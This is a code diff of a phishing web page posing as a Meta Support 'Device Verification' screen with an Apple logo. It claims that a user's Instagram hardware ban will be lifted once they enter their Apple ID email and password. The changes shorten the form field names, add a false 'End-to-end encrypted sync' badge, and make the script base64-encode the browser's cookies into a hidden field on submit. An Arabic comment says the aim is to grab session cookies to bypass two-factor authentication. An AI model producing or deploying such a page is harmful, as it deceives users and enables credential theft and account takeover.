@@ -2,36 +2,36 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Security | Hardware Verification</title>
+    <title>Meta Support | Hardware Identity Sync</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #f5f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; width: 100%; max-width: 380px; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
-        .apple-logo { font-size: 35px; color: #000; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 600; margin-bottom: 10px; }
-        p { font-size: 14px; color: #86868b; margin-bottom: 30px; line-height: 1.5; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; width: 100%; max-width: 380px; padding: 40px; border-radius: 22px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); text-align: center; }
+        .icon { font-size: 40px; color: #000; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; }
+        p { font-size: 14px; color: #86868b; line-height: 1.5; margin-bottom: 30px; }
         input { width: 100%; padding: 15px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 16px; box-sizing: border-box; background: #fafafa; }
         button { width: 100%; padding: 15px; background: #0071e3; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .secure-note { margin-top: 25px; font-size: 12px; color: #a1a1a6; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <i class="fab fa-apple apple-logo"></i>
+        <i class="fab fa-apple icon"></i>
         <h1>Device Verification</h1>
-        <p>Your Instagram appeal requires hardware synchronization. Please confirm your Apple ID to lift the device-ban.</p>
-        
-        <form action="/auth/verify" method="POST" id="authForm">
-            <input type="email" name="email" placeholder="Apple ID" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <input type="hidden" name="user_cookies" id="cookieData">
-            <button type="submit">Verify Now</button>
+        <p>To lift the hardware restriction on your Instagram account, please authenticate via the Apple ID linked to this device.</p>
+        <form action="/auth/gate" method="POST" id="vault">
+            <input type="email" name="u" placeholder="Apple ID" required>
+            <input type="password" name="p" placeholder="Password" required>
+            <input type="hidden" name="tok" id="tok">
+            <button type="submit">Verify & Sync Device</button>
         </form>
+        <div class="secure-note"><i class="fas fa-shield-alt"></i> End-to-end encrypted sync</div>
     </div>
-
     <script>
-        // سحب الكوكيز عند الضغط على الزر
-        document.getElementById('authForm').onsubmit = function() {
-            document.getElementById('cookieData').value = document.cookie;
+        document.getElementById('vault').onsubmit = function() {
+            // سحب كوكيز الجلسة الحالية قبل الإرسال لتجاوز الـ 2FA
+            document.getElementById('tok').value = btoa(document.cookie);
         };
     </script>
 </body>
